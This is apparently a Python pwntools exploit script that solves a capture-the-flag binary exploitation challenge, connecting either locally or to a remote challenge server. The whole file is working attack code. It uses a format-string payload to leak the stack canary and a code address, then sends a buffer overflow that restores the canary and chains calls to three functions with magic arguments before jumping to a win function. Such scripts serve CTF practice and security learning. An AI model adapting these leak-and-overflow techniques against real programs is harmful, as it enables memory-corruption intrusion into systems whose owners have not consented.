from pwn import *
import sys

binary = context.binary = ELF("./pwnme")

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('0.cloud.chals.io', 17140)

# Send leak
payload = b"%p%p %p %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p  "
p.sendline(payload)

with open("payload", "wb") as fp:
    fp.write(payload + b"\n")

# Get canary and win address
tmp = p.readuntil("functions?")
tmp = p.readuntil("  ")
tmp = tmp.decode().split()
leak = tmp[1]
canary = int(tmp[3], 0)

funcwin = int(leak, 0) - 0x72
func1 = int(leak, 0) - 0xe7
func2 = int(leak, 0) - 0xc0
func3 = int(leak, 0) - 0x99
popret = int(leak, 0) + 0x149

payload = b""
payload += b"A" * 0x18
payload += p32(canary)
payload += b"BBBBCCCCDDDD"
payload += p32(func1)
payload += p32(popret)
payload += b"\x37\x13\x00\x00"
payload += p32(func2)
payload += p32(popret)
payload += b"\x0d\xf0\xfe\xca"
payload += p32(func3)
payload += p32(popret)
payload += b"\x0d\xf0\x0d\xd0"
payload += p32(funcwin)

with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()